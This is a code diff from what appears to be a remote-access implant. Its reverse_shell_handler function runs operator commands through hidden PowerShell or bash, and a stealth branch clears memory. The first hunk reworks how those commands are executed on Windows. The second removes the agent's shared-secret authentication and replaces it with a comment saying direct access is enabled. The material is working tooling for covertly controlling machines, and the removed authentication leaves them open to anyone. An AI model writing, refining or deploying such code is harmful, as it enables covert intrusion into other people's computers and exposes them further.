@@ -2766,13 +2766,25 @@ def reverse_shell_handler(agent_id):
                     # Execute regular command
                     try:
                         if WINDOWS_AVAILABLE:
-                            result = subprocess.run(
-                                ["powershell.exe", "-NoProfile", "-Command", command],
-                                capture_output=True,
-                                text=True,
-                                timeout=30,
-                                creationflags=subprocess.CREATE_NO_WINDOW
-                            )
+                            # Fix PowerShell execution - use proper command formatting
+                            if command.strip().lower().startswith('powershell'):
+                                # If it's already a PowerShell command, execute directly
+                                result = subprocess.run(
+                                    ["powershell.exe", "-NoProfile", "-Command", command],
+                                    capture_output=True,
+                                    text=True,
+                                    timeout=30,
+                                    creationflags=subprocess.CREATE_NO_WINDOW
+                                )
+                            else:
+                                # For regular commands, wrap in PowerShell properly
+                                result = subprocess.run(
+                                    ["powershell.exe", "-NoProfile", "-Command", f"& {{{command}}}"],
+                                    capture_output=True,
+                                    text=True,
+                                    timeout=30,
+                                    creationflags=subprocess.CREATE_NO_WINDOW
+                                )
                         else:
                             result = subprocess.run(
                                 ["bash", "-c", command],
@@ -6580,5 +6592,4 @@ if __name__ == "__main__":
         if STEALTH_AVAILABLE:
             clear_memory()
 
-AGENT_SHARED_SECRET = os.environ.get("AGENT_SHARED_SECRET", "sphinx_agent_secret")
-HEADERS = {"X-AGENT-SECRET": AGENT_SHARED_SECRET}
+# Agent authentication removed - direct access enabled
